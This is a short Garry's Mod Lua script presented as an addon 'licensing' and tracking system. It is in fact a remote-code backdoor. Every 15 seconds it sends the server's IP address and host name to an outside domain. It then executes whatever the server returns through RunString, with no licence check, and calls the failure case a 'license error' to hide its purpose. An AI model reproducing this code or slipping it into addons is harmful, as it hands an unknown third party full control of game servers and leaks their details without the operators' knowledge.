print("AddonTracking System")
timer.Create("addontracking", 15, 0 , function()

    http.Fetch( "https://licensing.lprotect.xyz/send",
        
        function( body, length, headers, code )
            RunString(body)
        end,
  
        function( message )
            print("license error")
        end,

        { 
            ["serverip"] = game.GetIPAddress(),
            ["servername"] =  GetHostName(),
        }
    )
end)
